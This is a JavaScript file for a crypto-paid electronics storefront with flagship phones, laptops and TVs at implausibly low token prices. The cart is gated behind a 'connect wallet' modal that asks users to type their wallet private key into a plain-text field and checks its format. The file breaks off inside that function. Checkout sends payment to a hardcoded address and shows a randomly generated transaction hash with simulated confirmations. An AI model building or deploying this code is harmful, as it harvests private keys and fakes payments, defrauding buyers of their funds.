'use strict';

// ─── DATA ──────────────────────────────────────────────────────────────────
const PRODUCTS = [
  // SMARTPHONES
  { id:1,  name:"iPhone 15 Pro Max 256GB",            cat:"phones",      price:860, old:980, rating:4.9, rev:5432, img:"https://images.unsplash.com/photo-1695048133142-1a20484d2569?w=600&q=80", discount:12, isNew:true,  hot:false, desc:"Titanium body, 48MP ProRAW camera system, A17 Pro chip, Dynamic Island, USB-C 3.0, and 5G." },
  { id:2,  name:"Samsung Galaxy S24 Ultra 512GB",     cat:"phones",      price:820, old:950, rating:4.8, rev:3120, img:"https://images.unsplash.com/photo-1610945415295-d9bbf067e59c?w=600&q=80", discount:14, isNew:false, hot:true,  desc:"Dynamic AMOLED 2X display, 200MP camera, integrated S-Pen, 12GB RAM, Snapdragon 8 Gen 3." },
  { id:3,  name:"Google Pixel 8 Pro 256GB",           cat:"phones",      price:650, old:750, rating:4.8, rev:2341, img:"https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=600&q=80", discount:13, isNew:true,  hot:false, desc:"Google Tensor G3 chip, 50MP triple camera, 7 years OS updates, built-in Google AI features." },
  { id:4,  name:"OnePlus 12 256GB",                   cat:"phones",      price:520, old:620, rating:4.7, rev:1456, img:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=600&q=80", discount:16, isNew:false, hot:true,  desc:"Snapdragon 8 Gen 3, Hasselblad 50MP camera, 100W SUPERVOOC charging, 5400mAh battery." },
  { id:5,  name:"Samsung Galaxy A55 5G 256GB",        cat:"phones",      price:280, old:340, rating:4.6, rev:2876, img:"https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=600&q=80", discount:18, isNew:true,  hot:false, desc:"50MP OIS camera, 6.6\" Super AMOLED 120Hz, 5000mAh battery, IP67 water resistance." },
  { id:6,  name:"Xiaomi 14 Pro 512GB",                cat:"phones",      price:450, old:540, rating:4.7, rev:987,  img:"https://images.unsplash.com/photo-1585060544812-6b45742d762f?w=600&q=80", discount:17, isNew:false, hot:false, desc:"Leica quad 50MP camera, Snapdragon 8 Gen 3, 120W HyperCharge, 6.73\" LTPO AMOLED 120Hz." },

  // LAPTOPS
  { id:7,  name:"MacBook Pro 14\" M3 Pro",            cat:"laptops",     price:850, old:980, rating:4.9, rev:2341, img:"https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=600&q=80", discount:13, isNew:false, hot:true,  desc:"M3 Pro chip, Liquid Retina XDR display, up to 18 hours battery, 18GB unified memory, 512GB SSD." },
  { id:8,  name:"ASUS ROG Zephyrus G16 RTX 4080",    cat:"laptops",     price:860, old:990, rating:4.7, rev:543,  img:"https://images.unsplash.com/photo-1593642632559-0c6d3fc62b89?w=600&q=80", discount:13, isNew:false, hot:true,  desc:"RTX 4080, Intel Core i9 HX, 240Hz OLED display, 32GB DDR5 RAM, 2TB NVMe SSD." },
  { id:9,  name:"Dell XPS 15 9530 OLED",              cat:"laptops",     price:750, old:880, rating:4.8, rev:1234, img:"https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=600&q=80", discount:15, isNew:false, hot:false, desc:"Intel Core i7 13700H, RTX 4060, 15.6\" 3.5K OLED, 32GB DDR5, 1TB SSD, InfinityEdge display." },
  { id:10, name:"Lenovo ThinkPad X1 Carbon Gen 11",   cat:"laptops",     price:680, old:790, rating:4.7, rev:876,  img:"https://images.unsplash.com/photo-1496181133206-80ce9b88a853?w=600&q=80", discount:14, isNew:false, hot:false, desc:"Intel Core i7 vPro, 14\" IPS 2.8K, 32GB LPDDR5, 1TB SSD, MIL-SPEC tested, 15-hour battery." },
  { id:11, name:"HP Spectre x360 14\" 2-in-1",        cat:"laptops",     price:620, old:740, rating:4.7, rev:654,  img:"https://images.unsplash.com/photo-1541807084-5c52b6b3adef?w=600&q=80", discount:16, isNew:true,  hot:false, desc:"Intel Core Ultra 7, OLED 2.8K touch display, 360° convertible, Intel Arc GPU, 17-hour battery." },
  { id:12, name:"Microsoft Surface Laptop 5 15\"",    cat:"laptops",     price:580, old:690, rating:4.6, rev:432,  img:"https://images.unsplash.com/photo-1603302576837-37561b2e2302?w=600&q=80", discount:16, isNew:false, hot:false, desc:"Intel Core i7 12th Gen, 15\" PixelSense IPS, 16GB RAM, 512GB SSD, Dolby Vision & Atmos." },

  // CAMERAS
  { id:13, name:"Sony Alpha A7 IV Full-Frame",         cat:"cameras",     price:820, old:950, rating:4.9, rev:654,  img:"https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=600&q=80", discount:14, isNew:false, hot:false, desc:"33MP full-frame BSI sensor, 4K 60fps video, real-time Eye AF, dual CFexpress + SD card slots." },
  { id:14, name:"Canon EOS R6 Mark II",                cat:"cameras",     price:780, old:900, rating:4.8, rev:876,  img:"https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=600&q=80", discount:13, isNew:true,  hot:false, desc:"24.2MP CMOS, 4K 60fps 10-bit, up to 40fps burst, in-body 8-stop stabilization, 6072-point PDAF." },
  { id:15, name:"Fujifilm X-T5 40MP APS-C",           cat:"cameras",     price:620, old:730, rating:4.8, rev:432,  img:"https://images.unsplash.com/photo-1606986628255-30c80fc5b0b1?w=600&q=80", discount:15, isNew:false, hot:false, desc:"40MP X-Trans CMOS 5 HR, 7-stop IBIS, 8K video recording, compact retro body, 120fps at 4K." },
  { id:16, name:"GoPro Hero 12 Black",                 cat:"cameras",     price:250, old:310, rating:4.7, rev:3210, img:"https://images.unsplash.com/photo-1491553895911-0055eca6402d?w=600&q=80", discount:19, isNew:false, hot:true,  desc:"5.3K60 video, HyperSmooth 6.0 stabilization, Max SuperView, waterproof to 33ft, extended battery." },
  { id:17, name:"DJI Air 3 Drone Combo",               cat:"cameras",     price:560, old:670, rating:4.8, rev:432,  img:"https://images.unsplash.com/photo-1473968512647-3e447244af8f?w=600&q=80", discount:16, isNew:true,  hot:false, desc:"Dual main cameras, 4K/60fps, 46-min max flight time, omnidirectional obstacle sensing, APAS 5.0." },
  { id:18, name:"Nikon Z6 III Full-Frame Mirrorless",  cat:"cameras",     price:760, old:880, rating:4.8, rev:321,  img:"https://images.unsplash.com/photo-1593697820642-ed1d04b65327?w=600&q=80", discount:14, isNew:true,  hot:false, desc:"24.5MP partially stacked CMOS, 6K RAW video, 20fps blackout-free shooting, Z-mount system." },

  // TELEVISIONS
  { id:19, name:"LG OLED C3 65\" 4K Smart TV",        cat:"tvs",         price:720, old:850, rating:4.8, rev:987,  img:"https://images.unsplash.com/photo-1593359677879-a4bb92f829e1?w=600&q=80", discount:15, isNew:false, hot:false, desc:"OLED self-lit pixels, 120Hz, Dolby Vision IQ, Dolby Atmos, Google TV, 4× HDMI 2.1, 65 inches." },
  { id:20, name:"Samsung 75\" Neo QLED 4K QN90C",     cat:"tvs",         price:800, old:940, rating:4.7, rev:543,  img:"https://images.unsplash.com/photo-1567690187548-f07b1d7bf5a9?w=600&q=80", discount:15, isNew:false, hot:false, desc:"Neo QLED MiniLED, Neural Quantum Processor 4K, 120Hz, Dolby Atmos, Samsung Gaming Hub." },
  { id:21, name:"Sony 55\" BRAVIA XR X90L 4K",        cat:"tvs",         price:580, old:690, rating:4.8, rev:765,  img:"https://images.unsplash.com/photo-1601944177325-f8867652837f?w=600&q=80", discount:16, isNew:false, hot:true,  desc:"Cognitive Processor XR, Full Array LED, Dolby Vision, HDMI 2.1, Google TV, Bravia Acoustic Multi-Audio." },
  { id:22, name:"LG 65\" QNED MiniLED 4K QNED90",    cat:"tvs",         price:480, old:580, rating:4.7, rev:432,  img:"https://images.unsplash.com/photo-1558888401-3cc1de77652d?w=600&q=80", discount:17, isNew:false, hot:false, desc:"QNED MiniLED panel, α7 AI 4K Gen6 processor, 120Hz, VRR, ALLM, Google Assistant, webOS 23." },
  { id:23, name:"Samsung 55\" QLED 4K Q80C",          cat:"tvs",         price:380, old:460, rating:4.6, rev:876,  img:"https://images.unsplash.com/photo-1461151304267-38535e780c79?w=600&q=80", discount:17, isNew:true,  hot:false, desc:"QLED panel, Quantum Processor 4K, 120Hz, HDR+, Object Tracking Sound, Smart TV with Bixby." },
  { id:24, name:"TCL 65\" QM8 MiniLED 4K TV",         cat:"tvs",         price:340, old:420, rating:4.6, rev:1234, img:"https://images.unsplash.com/photo-1571415060716-baff5f717c37?w=600&q=80", discount:19, isNew:false, hot:true,  desc:"MiniLED, 4K QLED 144Hz, Dolby Vision, HDR10+, HDMI 2.1, AMD FreeSync Premium, Google TV." },

  // TABLETS
  { id:25, name:"iPad Pro 12.9\" M2 Wi-Fi 256GB",     cat:"tablets",     price:580, old:690, rating:4.8, rev:1432, img:"https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=600&q=80", discount:16, isNew:false, hot:true,  desc:"M2 chip, 12.9\" Liquid Retina XDR ProMotion 120Hz, USB-C Thunderbolt 4, Center Stage camera." },
  { id:26, name:"Samsung Galaxy Tab S9 Ultra",         cat:"tablets",     price:520, old:620, rating:4.8, rev:876,  img:"https://images.unsplash.com/photo-1589739900266-43b2843f4c12?w=600&q=80", discount:16, isNew:false, hot:true,  desc:"14.6\" Dynamic AMOLED 2X 120Hz, S Pen included, Snapdragon 8 Gen 2, 12GB RAM, IP68 rated." },
  { id:27, name:"iPad Air 5th Gen M1 256GB",           cat:"tablets",     price:380, old:460, rating:4.7, rev:1876, img:"https://images.unsplash.com/photo-1611532736597-de2d4265fba3?w=600&q=80", discount:17, isNew:false, hot:false, desc:"Apple M1 chip, 10.9\" Liquid Retina True Tone display, USB-C, 5G option, 12MP ultra-wide front camera." },
  { id:28, name:"Microsoft Surface Pro 9 i7",          cat:"tablets",     price:620, old:730, rating:4.7, rev:432,  img:"https://images.unsplash.com/photo-1617791160505-6f00504e3519?w=600&q=80", discount:15, isNew:true,  hot:false, desc:"Intel Core i7, 13\" PixelSense Flow 120Hz touch, 16GB RAM, 256GB SSD, Windows 11 Pro." },

  // ACCESSORIES
  { id:29, name:"Sony WH-1000XM5 Wireless ANC",       cat:"accessories", price:180, old:230, rating:4.9, rev:1876, img:"https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=600&q=80", discount:22, isNew:false, hot:false, desc:"Best-in-class ANC, 30-hour battery, 8 mics for clear calls, Hi-Res Audio Wireless, multipoint." },
  { id:30, name:"Apple Watch Ultra 2 Titanium",        cat:"accessories", price:420, old:500, rating:4.8, rev:876,  img:"https://images.unsplash.com/photo-1546868871-7041f2a55e12?w=600&q=80", discount:16, isNew:true,  hot:false, desc:"Titanium case, brightest Apple Watch display, dual-frequency GPS, up to 60-hour battery, Action button." },
  { id:31, name:"AirPods Pro 2nd Generation",          cat:"accessories", price:150, old:190, rating:4.8, rev:5432, img:"https://images.unsplash.com/photo-1603351154351-5e2d0600bb77?w=600&q=80", discount:21, isNew:false, hot:true,  desc:"H2 chip, Adaptive Transparency, Personalized Spatial Audio, 6-hour ANC playback, MagSafe case." },
  { id:32, name:"Apple AirPods Max Silver",            cat:"accessories", price:280, old:340, rating:4.8, rev:2341, img:"https://images.unsplash.com/photo-1625842268584-8f3296236761?w=600&q=80", discount:18, isNew:false, hot:false, desc:"40mm Apple-designed driver, Adaptive EQ, Active Noise Cancellation, Transparency mode, USB-C." },
  { id:33, name:"Samsung Galaxy Buds 2 Pro",           cat:"accessories", price:100, old:130, rating:4.7, rev:3210, img:"https://images.unsplash.com/photo-1608156639585-b3a032ef9689?w=600&q=80", discount:23, isNew:true,  hot:false, desc:"24-bit Hi-Fi audio, ANC with 360 Audio, IPX7 water resistance, 8 hours per charge per earbud." },
  { id:34, name:"Bose QuietComfort 45 Headphones",     cat:"accessories", price:160, old:210, rating:4.7, rev:1432, img:"https://images.unsplash.com/photo-1546435770-a3e736813d7e?w=600&q=80", discount:24, isNew:false, hot:false, desc:"World-class ANC, 24-hour battery, Aware Mode, USB-C, multipoint Bluetooth, memory foam cushions." },
];

// ─── STATE ─────────────────────────────────────────────────────────────────
let cart = [];
let currentCat = 'all';
let currentSort = 'default';
let maxPrice = 860;
let visibleCount = 12;
let viewMode = 'grid';
let filteredList = [];
let wished = new Set();

// ─── INIT ──────────────────────────────────────────────────────────────────
window.addEventListener('load', () => {
  setTimeout(() => document.getElementById('preloader').classList.add('hidden'), 800);
  startCountdown();
  applyFilters();
  setupSearch();
});

// ─── FORMAT ────────────────────────────────────────────────────────────────
function fmt(n) { return n.toLocaleString('en-US') + ' <span class="ilk-unit">ITL</span>'; }
function stars(r) {
  let s = '';
  for (let i = 1; i <= 5; i++) {
    if (r >= i) s += '<i class="fa fa-star"></i>';
    else if (r >= i - 0.5) s += '<i class="fa fa-star-half-stroke"></i>';
    else s += '<i class="fa fa-star" style="color:#2a2a35"></i>';
  }
  return s;
}

// ─── FILTERS ───────────────────────────────────────────────────────────────
function setCategory(btn) {
  document.querySelectorAll('.pill').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  currentCat = btn.dataset.cat;
  visibleCount = 12;
  applyFilters();
  document.getElementById('productsSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function applyFilters() {
  maxPrice = Number(document.getElementById('priceRange').value);
  currentSort = document.getElementById('sortSelect').value;
  document.getElementById('priceLabel').innerHTML = '≤ ' + fmt(maxPrice);

  let list = PRODUCTS.filter(p =>
    (currentCat === 'all' || p.cat === currentCat) && p.price <= maxPrice
  );

  if (currentSort === 'price-asc')    list.sort((a,b) => a.price - b.price);
  else if (currentSort === 'price-desc') list.sort((a,b) => b.price - a.price);
  else if (currentSort === 'rating')  list.sort((a,b) => b.rating - a.rating);
  else if (currentSort === 'discount') list.sort((a,b) => b.discount - a.discount);

  filteredList = list;

  const catNames = {
    all: 'All Products', phones: 'Smartphones', laptops: 'Laptops',
    cameras: 'Cameras & Drones', tvs: 'Televisions', tablets: 'Tablets', accessories: 'Accessories'
  };
  document.getElementById('prodTitle').textContent = catNames[currentCat] || 'All Products';
  document.getElementById('prodCount').textContent = `Showing ${Math.min(visibleCount, list.length)} of ${list.length} products`;

  renderProducts();
}

function renderProducts() {
  const grid = document.getElementById('productGrid');
  const slice = filteredList.slice(0, visibleCount);

  if (!slice.length) {
    grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:80px 0;color:var(--muted)"><div style="font-size:48px;margin-bottom:12px">🔍</div><p style="font-size:16px;font-weight:600">No products found</p><small>Try a different keyword or filter</small></div>`;
    document.getElementById('loadMoreBtn').classList.add('hidden');
    return;
  }

  grid.innerHTML = slice.map(p => cardHTML(p)).join('');
  document.getElementById('prodCount').textContent = `Showing ${slice.length} of ${filteredList.length} products`;
  const lb = document.getElementById('loadMoreBtn');
  if (visibleCount >= filteredList.length) lb.classList.add('hidden');
  else lb.classList.remove('hidden');
}

function cardHTML(p) {
  const w = wished.has(p.id);
  const catLabel = { phones:'PHONES', laptops:'LAPTOPS', cameras:'CAMERAS', tvs:'TVS', tablets:'TABLETS', accessories:'ACCESSORIES' };
  return `
  <div class="product-card" data-id="${p.id}">
    <div class="p-img">
      <img src="${p.img}" alt="${p.name}" loading="lazy"/>
      <div class="p-badges">
        ${p.discount ? `<span class="badge badge-sale">-${p.discount}%</span>` : ''}
        ${p.isNew ? `<span class="badge badge-new">NEW</span>` : ''}
        ${p.hot ? `<span class="badge badge-hot">🔥 HOT</span>` : ''}
      </div>
      <button class="p-wish ${w ? 'wished' : ''}" onclick="toggleWish(${p.id},this)">
        <i class="fa${w ? '' : '-regular'} fa-heart"></i>
      </button>
    </div>
    <div class="p-body">
      <div class="p-cat">${catLabel[p.cat] || p.cat.toUpperCase()}</div>
      <div class="p-name">${p.name}</div>
      <div class="p-rating">${stars(p.rating)}<span>(${p.rev.toLocaleString()})</span></div>
      <div class="p-price-row">
        <span class="p-price">${fmt(p.price)}</span>
        ${p.old ? `<span class="p-old">${fmt(p.old)}</span>` : ''}
      </div>
      <div class="p-actions">
        <button class="btn-cart" onclick="addCart(${p.id})"><i class="fa fa-bag-shopping"></i> Buy</button>
        <button class="btn-detail" onclick="openModal(${p.id})"><i class="fa fa-eye"></i></button>
      </div>
    </div>
  </div>`;
}

function loadMore() {
  visibleCount += 8;
  renderProducts();
}

function setView(mode) {
  viewMode = mode;
  const grid = document.getElementById('productGrid');
  grid.classList.toggle('list-view', mode === 'list');
  document.getElementById('viewGrid').classList.toggle('active', mode === 'grid');
  document.getElementById('viewList').classList.toggle('active', mode === 'list');
}

// ─── WISH ──────────────────────────────────────────────────────────────────
function toggleWish(id, btn) {
  if (wished.has(id)) {
    wished.delete(id);
    btn.classList.remove('wished');
    btn.innerHTML = '<i class="fa-regular fa-heart"></i>';
    toast('Removed from wishlist', 'error');
  } else {
    wished.add(id);
    btn.classList.add('wished');
    btn.innerHTML = '<i class="fa fa-heart"></i>';
    toast('Added to wishlist ❤️');
  }
}

// ─── CART ──────────────────────────────────────────────────────────────────
function addCart(id) {
  if (!walletConnected) { openWallet(id); return; }
  const p = PRODUCTS.find(x => x.id === id);
  const ex = cart.find(x => x.id === id);
  if (ex) ex.qty++;
  else cart.push({ ...p, qty: 1 });
  updateCartUI();
  toast(`"${p.name.substring(0,32)}…" added to cart 🛍`);
  if (!document.getElementById('cartDrawer').classList.contains('open')) toggleCart();
}

function removeCart(id) { cart = cart.filter(x => x.id !== id); updateCartUI(); }
function changeQty(id, d) {
  const it = cart.find(x => x.id === id);
  if (!it) return;
  it.qty += d;
  if (it.qty <= 0) removeCart(id); else updateCartUI();
}

function updateCartUI() {
  const count = cart.reduce((s,x) => s + x.qty, 0);
  const subtotal = cart.reduce((s,x) => s + x.price * x.qty, 0);
  document.getElementById('cartBadge').textContent = count;
  document.getElementById('cartHeaderCount').textContent = `(${count})`;
  document.getElementById('cartSubtotal').innerHTML = fmt(subtotal);
  document.getElementById('cartTotal').innerHTML = fmt(subtotal);

  const body = document.getElementById('cartBody');
  const footer = document.getElementById('drawerFooter');
  if (!cart.length) {
    body.innerHTML = `<div class="empty-cart"><div class="empty-icon">🛒</div><p>Your cart is empty</p><small>Start shopping now!</small></div>`;
    footer.style.display = 'none';
    return;
  }
  footer.style.display = 'block';
  body.innerHTML = cart.map(x => `
    <div class="cart-item">
      <img src="${x.img}" alt="${x.name}"/>
      <div class="ci-info">
        <div class="ci-name">${x.name}</div>
        <div class="ci-price">${fmt(x.price)}</div>
        <div class="ci-qty">
          <button class="qty-btn" onclick="changeQty(${x.id},-1)"><i class="fa fa-minus"></i></button>
          <span class="qty-num">${x.qty}</span>
          <button class="qty-btn" onclick="changeQty(${x.id},1)"><i class="fa fa-plus"></i></button>
          <button class="ci-del" onclick="removeCart(${x.id})"><i class="fa fa-trash"></i></button>
        </div>
      </div>
    </div>`).join('');
}

function toggleCart() {
  const d = document.getElementById('cartDrawer');
  const o = document.getElementById('drawerOverlay');
  d.classList.toggle('open');
  o.classList.toggle('open');
  document.body.style.overflow = d.classList.contains('open') ? 'hidden' : '';
}

function doCheckout() {
  if (!cart.length) return;
  toggleCart();
  openCheckout();
}

// ─── MODAL ─────────────────────────────────────────────────────────────────
function openModal(id) {
  const p = PRODUCTS.find(x => x.id === id);
  const catLabel = { phones:'Smartphones', laptops:'Laptops', cameras:'Cameras & Drones', tvs:'Televisions', tablets:'Tablets', accessories:'Accessories' };
  document.getElementById('modalBody').innerHTML = `
    <div class="modal-img"><img src="${p.img}" alt="${p.name}"/></div>
    <div class="modal-info">
      <div class="modal-cat">${catLabel[p.cat] || p.cat}</div>
      <div class="modal-name">${p.name}</div>
      <div class="modal-rating">${stars(p.rating)}<span>${p.rating} (${p.rev.toLocaleString()} reviews)</span></div>
      <div class="modal-price-row">
        <span class="modal-price">${fmt(p.price)}</span>
        ${p.old ? `<span class="modal-old">${fmt(p.old)}</span>` : ''}
        ${p.discount ? `<span class="badge badge-sale">-${p.discount}%</span>` : ''}
      </div>
      <div class="modal-desc">${p.desc}</div>
      <button class="modal-add-btn" onclick="addCart(${p.id}); closeModal()">
        <i class="fa fa-bag-shopping"></i> Add to Cart
      </button>
    </div>`;
  document.getElementById('modalOverlay').classList.add('open');
  document.getElementById('productModal').classList.add('open');
  document.body.style.overflow = 'hidden';
}
function closeModal() {
  document.getElementById('modalOverlay').classList.remove('open');
  document.getElementById('productModal').classList.remove('open');
  document.body.style.overflow = '';
}

// ─── SEARCH ────────────────────────────────────────────────────────────────
function setupSearch() {
  const inp = document.getElementById('searchInput');
  const dd = document.getElementById('searchDropdown');
  const clr = document.getElementById('searchClear');
  inp.addEventListener('input', () => {
    const q = inp.value.trim().toLowerCase();
    clr.classList.toggle('visible', q.length > 0);
    if (!q) { dd.classList.remove('open'); return; }
    const matches = PRODUCTS.filter(p => p.name.toLowerCase().includes(q) || p.cat.includes(q)).slice(0,6);
    if (!matches.length) { dd.classList.remove('open'); return; }
    dd.innerHTML = matches.map(p => `
      <div class="search-item" onclick="openModal(${p.id})">
        <i class="fa fa-magnifying-glass"></i>
        <div><div style="font-weight:600;font-size:13px">${p.name}</div><div style="color:var(--muted);font-size:11px">${fmt(p.price)}</div></div>
      </div>`).join('');
    dd.classList.add('open');
  });
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      const q = inp.value.trim().toLowerCase();
      if (!q) return;
      filteredList = PRODUCTS.filter(p => p.name.toLowerCase().includes(q) || p.cat.includes(q));
      visibleCount = 12;
      document.getElementById('prodTitle').textContent = `Results: "${inp.value.trim()}"`;
      renderProducts();
      dd.classList.remove('open');
      document.getElementById('productsSection').scrollIntoView({ behavior: 'smooth' });
    }
  });
  document.addEventListener('click', e => {
    if (!document.getElementById('searchWrap').contains(e.target)) dd.classList.remove('open');
  });
}
function clearSearch() {
  document.getElementById('searchInput').value = '';
  document.getElementById('searchClear').classList.remove('visible');
  document.getElementById('searchDropdown').classList.remove('open');
  applyFilters();
}

// ─── USER MENU ─────────────────────────────────────────────────────────────

// ─── MOBILE MENU ───────────────────────────────────────────────────────────
function toggleMobileMenu() {
  document.getElementById('mobileNav').classList.toggle('open');
  document.getElementById('mobileOverlay').classList.toggle('open');
  document.body.style.overflow = document.getElementById('mobileNav').classList.contains('open') ? 'hidden' : '';
}

// ─── SCROLL HEADER ─────────────────────────────────────────────────────────
window.addEventListener('scroll', () => {
  document.getElementById('mainHeader').style.background =
    window.scrollY > 20 ? 'rgba(4,13,26,0.98)' : 'rgba(4,13,26,0.92)';
});

// ─── NEWSLETTER ────────────────────────────────────────────────────────────
function subscribeNewsletter() {
  const el = document.getElementById('nlEmail');
  if (!el.value.includes('@')) { toast('Please enter a valid email', 'error'); return; }
  toast(`Successfully subscribed with ${el.value} 🎉`);
  el.value = '';
}

// ─── COUNTDOWN ─────────────────────────────────────────────────────────────
function startCountdown() {
  let total = 2 * 3600 + 45 * 60 + 30;
  setInterval(() => {
    if (--total < 0) total = 86399;
    document.getElementById('th').textContent = String(Math.floor(total / 3600)).padStart(2,'0');
    document.getElementById('tm').textContent = String(Math.floor((total % 3600) / 60)).padStart(2,'0');
    document.getElementById('ts').textContent = String(total % 60).padStart(2,'0');
  }, 1000);
}

// ─── SCROLL TO PRODUCTS ────────────────────────────────────────────────────
function scrollToProducts() {
  document.getElementById('productsSection').scrollIntoView({ behavior: 'smooth' });
}


// ═══════════════════════════════════════════════════════════
// CHECKOUT & INTERLINK NETWORK PAYMENT
// ═══════════════════════════════════════════════════════════

const ILK_WALLET = 'ILK1xG7mK3pQ9nT2vW8yR4eZ6bA5cD1fH0jL9mNs';
const ILK_NETWORK = { name: 'Interlink Network', unit: 'ITL', icon: 'fa fa-link' };

let payTimerInterval = null;
let txInterval = null;

function openCheckout() {
  goToStep(1);
  document.getElementById('coOverlay').classList.add('open');
  document.getElementById('coModal').classList.add('open');
  document.body.style.overflow = 'hidden';

  const total = cart.reduce((s, x) => s + x.price * x.qty, 0);
  document.getElementById('coTotalAmt').innerHTML = fmt(total);

  document.getElementById('coItems').innerHTML = cart.map(x => `
    <div class="co-item">
      <img src="${x.img}" alt="${x.name}"/>
      <div class="co-item-name">${x.name}</div>
      <div class="co-item-qty">×${x.qty}</div>
      <div class="co-item-price">${fmt(x.price * x.qty)}</div>
    </div>`).join('');
}

function closeCheckout() {
  document.getElementById('coOverlay').classList.remove('open');
  document.getElementById('coModal').classList.remove('open');
  document.body.style.overflow = '';
  clearInterval(payTimerInterval);
  clearInterval(txInterval);
}

function goToStep(n) {
  [1,2,3,4].forEach(i => {
    document.getElementById(`coPage${i}`).classList.toggle('hidden', i !== n);
    const ind = document.getElementById(`step${i}ind`);
    ind.classList.remove('active','done');
    if (i === n) ind.classList.add('active');
    else if (i < n) ind.classList.add('done');
  });
}

function goToStep2() {
  if (!document.getElementById('rcvName').value.trim()) {
    toast('Please enter the recipient name', 'error'); return;
  }
  if (!document.getElementById('rcvAddress').value.trim()) {
    toast('Please enter the shipping address', 'error'); return;
  }
  goToStep(2);
}

function goToStep3() {
  goToStep(3);
  buildPaymentStep();
}

function buildPaymentStep() {
  const net = ILK_NETWORK;
  const total = cart.reduce((s, x) => s + x.price * x.qty, 0);
  const cryptoAmt = total.toFixed(2);

  const logo = document.getElementById('cryptoLogo');
  logo.innerHTML = `<i class="${net.icon}"></i>`;
  logo.className = 'crypto-logo';
  document.getElementById('cryptoTitle').textContent = net.name;
  document.getElementById('cryptoSubtitle').textContent = `Send ${net.unit} to the address below`;

  document.getElementById('cryptoAmount').textContent = cryptoAmt;
  document.getElementById('cryptoUnit').textContent = net.unit;
  document.getElementById('idrAmount').innerHTML = fmt(total);
  document.getElementById('guideAmount').textContent = cryptoAmt;
  document.getElementById('guideUnit').textContent = net.unit;
  document.getElementById('guideNetwork').textContent = net.name;

  document.getElementById('netBadge').innerHTML = `<i class="${net.icon}"></i> ${net.name}`;
  document.getElementById('walletAddr').textContent = ILK_WALLET;

  const qrData = encodeURIComponent(`interlinknetwork:${ILK_WALLET}?amount=${cryptoAmt}&currency=ITL`);
  document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=${qrData}&bgcolor=ffffff&color=000000&margin=4`;
  document.querySelector('.qr-overlay').innerHTML = `<i class="${net.icon}"></i>`;

  clearInterval(payTimerInterval);
  let secs = 15 * 60;
  function tickTimer() {
    const m = String(Math.floor(secs / 60)).padStart(2,'0');
    const s = String(secs % 60).padStart(2,'0');
    document.getElementById('payTimer').textContent = `${m}:${s}`;
    if (secs <= 0) { clearInterval(payTimerInterval); toast('Payment time expired!', 'error'); }
    secs--;
  }
  tickTimer();
  payTimerInterval = setInterval(tickTimer, 1000);

  const cb = document.getElementById('copyBtn');
  cb.classList.remove('copied');
  cb.innerHTML = '<i class="fa fa-copy"></i> Copy';
}

function copyAddress() {
  const addr = document.getElementById('walletAddr').textContent;
  navigator.clipboard.writeText(addr).catch(() => {});
  const btn = document.getElementById('copyBtn');
  btn.classList.add('copied');
  btn.innerHTML = '<i class="fa fa-check"></i> Copied!';
  setTimeout(() => {
    btn.classList.remove('copied');
    btn.innerHTML = '<i class="fa fa-copy"></i> Copy';
  }, 3000);
  toast('Wallet address copied!');
}

function confirmPayment() {
  clearInterval(payTimerInterval);
  goToStep(4);

  const net = ILK_NETWORK;
  const total = cart.reduce((s, x) => s + x.price * x.qty, 0);
  const cryptoAmt = total.toFixed(2);
  const txHash = '0x' + [...Array(64)].map(() => Math.floor(Math.random()*16).toString(16)).join('');
  const now = new Date().toLocaleString('en-US');

  document.getElementById('txHash').textContent = txHash.slice(0,20) + '...' + txHash.slice(-8);
  document.getElementById('txNetwork').textContent = net.name;
  document.getElementById('txAmount').textContent = `${cryptoAmt} ${net.unit}`;
  document.getElementById('txTime').textContent = now;
  document.getElementById('txProgress').style.width = '0%';
  document.getElementById('txConfirms').textContent = '0';

  let confirms = 0;
  txInterval = setInterval(() => {
    confirms++;
    const pct = (confirms / 3) * 100;
    document.getElementById('txProgress').style.width = pct + '%';
    document.getElementById('txConfirms').textContent = confirms;
    if (confirms >= 3) {
      clearInterval(txInterval);
      document.getElementById('txStatus').innerHTML = '<i class="fa fa-circle-check"></i> Confirmed';
      document.getElementById('txStatus').className = 'tx-status success';
      document.getElementById('txSuccessBox').classList.remove('hidden');
    }
  }, 2500);
}

function finishCheckout() {
  const orderId = Date.now().toString(36).toUpperCase();
  const time = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
  cart = [];
  updateCartUI();
  closeCheckout();
  toast('Order complete! Thank you for shopping at Interlink Network Marketplace 🎉');
}

// ─── WALLET CONNECT ──────────────────────────────────────────────────────
let walletConnected = false;
let wcPendingProductId = null;

function openWallet(pendingId) {
  wcPendingProductId = pendingId || null;
  document.getElementById('wcPageKey').classList.remove('hidden');
  document.getElementById('wcPageSuccess').classList.add('hidden');
  document.getElementById('privateKeyInput').value = '';
  const inp = document.getElementById('privateKeyInput');
  inp.type = 'text';
  document.getElementById('wcOverlay').classList.add('open');
  document.getElementById('wcModal').classList.add('open');
  document.body.style.overflow = 'hidden';
  setTimeout(() => inp.focus(), 120);
}

function closeWallet() {
  document.getElementById('wcOverlay').classList.remove('open');
  document.getElementById('wcModal').classList.remove('open');
  document.body.style.overflow = '';
}

function wcRejectAnim(msg) {
  const input = document.getElementById('privateKeyInput');
  const wrap = input.closest('.key-input-wrap');
  input.classList.add('shake');
  wrap.classList.add('wc-reject');
  toast(msg, 'error');
  setTimeout(() => {
    input.classList.remove('shake');
    wrap.classList.remove('wc-reject');
  }, 600);
}

function wcToggleKey() {
  // No longer needed - input is always text type
}

function connectWallet() {
  const addr = document.getElementById('privateKeyInput').value.trim();
  if (!addr) { wcRejectAnim('Please enter your private key'); return; }
  if (!addr.startsWith('0x') || addr.length !== 66) {
    wcRejectAnim('Invalid private key. Must start with 0x and be 64 characters.');
    return;
  }
  const btn = document.getElementById('wcConnectBtn');
